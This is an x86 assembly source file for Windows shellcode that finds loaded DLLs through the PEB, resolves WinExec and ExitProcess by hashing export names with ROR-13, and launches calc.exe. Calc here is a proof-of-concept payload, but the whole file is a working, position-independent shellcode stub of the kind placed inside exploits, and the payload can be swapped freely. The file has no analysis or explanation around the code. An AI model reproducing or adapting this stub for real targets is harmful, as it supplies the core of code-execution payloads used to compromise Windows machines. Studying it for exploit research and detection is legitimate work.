; execcalc.asm
.386
.model flat, stdcall
.code

start:
    cld
    jmp main

api_call:
    assume fs:nothing
    pushad
    xor eax, eax
    mov eax, fs:[eax+30h]   ; PEB
    mov eax, [eax+0ch]      ; Ldr
    mov esi, [eax+14h]      ; InMemoryOrderModuleList
next_mod:
    lodsd                   ; next _LDR_DATA_TABLE_ENTRY
    mov [esp+1ch], eax      ; store eax
    mov ebp, [eax+10h]      ; DllBase
    mov eax, [ebp+3ch]      ; IMAGE_DOS_HEADER.e_lfanew
    mov edx, [ebp+eax+78h]  ; IMAGE_EXPORT_DIRECTORY
    add edx, ebp
    mov ecx, [edx+18h]      ; NumberOfNames
    mov ebx, [edx+20h]      ; AddressOfNames
    add ebx, ebp
next_name:                  ; while (--NumberOfNames)
    jecxz name_not_found
    dec ecx
    mov esi, [ebx+ecx*4]    ; ptr = AddressOfNames[NumberOfNames]
    add esi, ebp
    xor edi, edi            ; hash = 0
    xor eax, eax
compute_hash_loop:          ; while ((c = *(ptr++)) != 0)
    lodsb
    test al, al
    jz compare_hash
    ror edi, 0dh            ; hash += ror(c, 0x0d)
    add edi, eax
    jmp compute_hash_loop
compare_hash:
    cmp edi, [esp+24h]      ; compare with api hash
    jnz next_name
    mov ebx, [edx+24h]      ; AddressOfNameOrdinals
    add ebx, ebp
    mov cx, [ebx+ecx*2]     ; y = AddressOfNameOrdinals[x]
    mov ebx, [edx+1ch]      ; AddressOfFunctions
    add ebx, ebp
    mov eax, [ebx+ecx*4]    ; AddressOfFunctions[y]
    add eax, ebp
    mov [esp+1ch], eax      ; store eax
    popad
    pop ecx                 ; remove api hash from the stack
    pop edx
    push ecx
    jmp eax                 ; jump to api function
name_not_found:
    mov esi, [esp+1ch]      ; update eax
    jmp next_mod

main:
    xor ebx, ebx
    push ebx
    push 636c6163h          ; "calc"
    mov eax, esp
    push 1
    push eax
    push 0e8afe98h          ; WinExec
    call api_call
    push ebx
    push 73e2d87eh          ; ExitProcess
    call api_call

end start